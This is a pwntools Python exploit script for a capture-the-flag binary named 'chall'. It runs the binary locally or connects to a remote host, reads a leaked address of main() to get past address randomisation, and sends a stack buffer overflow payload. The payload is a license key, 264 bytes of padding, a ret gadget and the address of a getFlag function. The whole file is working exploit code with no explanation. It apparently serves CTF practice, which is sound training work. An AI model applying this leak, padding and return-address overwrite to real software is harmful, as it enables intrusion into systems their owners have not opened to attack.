from pwn import *
import sys

BINARY = "chall"
context.binary = exe = ELF(f"./{BINARY}", checksec=False)
context.terminal = "konsole -e".split()
context.log_level = "INFO"
context.bits = 64
context.arch = "amd64"


def init():
    if args.RMT:
        p = remote(sys.argv[1], sys.argv[2])
    else:
        p = process()
    return Exploit(p), p


class Exploit:
    def __init__(self, p: process):
        self.p = p

    def debug(self, script=None):
        if not args.RMT:
            if script:
                attach(self.p, script)
            else:
                attach(self.p)

    def send(self, content):
        p = self.p
        p.sendlineafter(
            b"Masukkan license key yang valid untuk mendapatkan flag:", content)
    def get_main_address(self) -> int:
        p = self.p
        p.recvuntil(b"addr of main(): ")
        return eval(p.recvline())

x, p = init()

x.debug((
    "break *vuln+64\nc\n"+
    "break *vuln+98\nc\n"
))


exe.address = x.get_main_address() - exe.sym['main']
license_key = b"CSH-2022-FLAG\x00"
pay = license_key+b"A"*(256+8-(len(license_key)))
pay += p64(ROP(exe).find_gadget(['ret'])[0])
pay += p64(exe.sym['getFlag'])
x.send(pay)

p.interactive()
